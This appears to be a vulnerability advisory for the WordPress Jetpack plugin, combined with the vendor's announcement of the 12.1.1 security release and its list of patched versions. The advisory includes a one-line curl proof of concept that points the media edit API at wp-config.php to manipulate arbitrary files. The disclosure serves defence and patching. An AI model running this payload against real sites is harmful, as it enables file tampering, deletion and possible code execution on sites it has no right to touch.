## WordPress Plugin Vulnerabilities

# Jetpack < 12.1.1 - Author+ Arbitrary File Manipulation via API

### Description

The plugin does not validate uploaded files, allowing users with author roles or above to manipulate existing files on the site, deleting arbitrary files, and in rare cases achieve Remote Code Execution via phar deserialization.

### Proof of Concept

curl --json '{ "media": {"tmp\_name": "/WP\_CONTENT\_PATH/wp-config.php", "name": "test.txt"} }' https://public-api.wordpress.com/rest/v1.2/sites/BLOG\_ID/media/1/edit
Where BLOG\_ID is the site Jetpack blog id.

# Jetpack 12.1.1: Critical Security Update

Updated on May 30, 2023 - Jeremy Herve

Earlier today, we released a new version of Jetpack, 12.1.1. This release contains a critical security update. While we have no evidence that this vulnerability has been exploited yet, please update your version of Jetpack as soon as possible to ensure the security of your site.

To help you in this process, we have worked closely with the WordPress.org Security Team to release patched versions of every version of Jetpack since 2.0. Most websites have been or will soon be automatically updated to a secured version.

During an internal security audit, we found a vulnerability with the API available in Jetpack since version 2.0, released in 2012. This vulnerability could be used by authors on a site to manipulate any files in the WordPress installation.

Here is a full list of the 102 different versions of Jetpack we’ve released today:

2.0.9, 2.1.7, 2.2.10, 2.3.10, 2.4.7, 2.5.5, 2.6.6, 2.7.5, 2.8.5, 2.9.6, 3.0.6, 3.1.5, 3.2.5, 3.3.6, 3.4.6, 3.5.6, 3.6.4, 3.7.5, 3.8.5, 3.9.9, 4.0.6, 4.1.3, 4.2.4, 4.3.4, 4.4.4, 4.5.2, 4.6.2, 4.7.3, 4.8.4, 4.9.2, 5.0.2, 5.1.3, 5.2.4, 5.3.3, 5.4.3, 5.5.4, 5.6.4, 5.7.4, 5.8.3, 5.9.3, 6.0.3, 6.1.4, 6.2.4, 6.3.6, 6.4.5, 6.5.3, 6.6.4, 6.7.3, 6.8.4, 6.9.3, 7.0.4, 7.1.4, 7.2.4, 7.3.4, 7.4.4, 7.5.6, 7.6.3, 7.7.5, 7.8.3, 7.9.3, 8.0.2, 8.1.3, 8.2.5, 8.3.2, 8.4.4, 8.5.2, 8.6.3, 8.7.3, 8.8.4, 8.9.3, 9.0.4, 9.1.2, 9.2.3, 9.3.4, 9.4.3, 9.5.4, 9.6.3, 9.7.2, 9.8.2, 9.9.2, 10.0.1, 10.1.1, 10.2.2, 10.3.1, 10.4.1, 10.5.2, 10.6.2, 10.7.1, 10.8.1, 10.9.2, 11.0.1, 11.1.3, 11.2.1, 11.3.3, 11.4.1, 11.5.2, 11.6.1, 11.7.2, 11.8.5, 11.9.2, 12.0.1, 12.1.1.

**If your site is running any of these versions, your website is not vulnerable to this issue.**

We have no evidence that this vulnerability has been exploited in the wild. However, now that the update has been released, it is possible that someone will try to take advantage of this vulnerability.

We apologize for any extra workload this may put on your shoulders today. We will continue to regularly audit all aspects of our codebase to ensure that your Jetpack site remains safe.

WordPress, TV Series, music, kids, and board games. I think that's probably the best way to define me in a few words. 🙂
I work at Automattic on the Jetpack plugin and its infrastructure. I talk a lot about WordPress things, but also about all things open source in general.
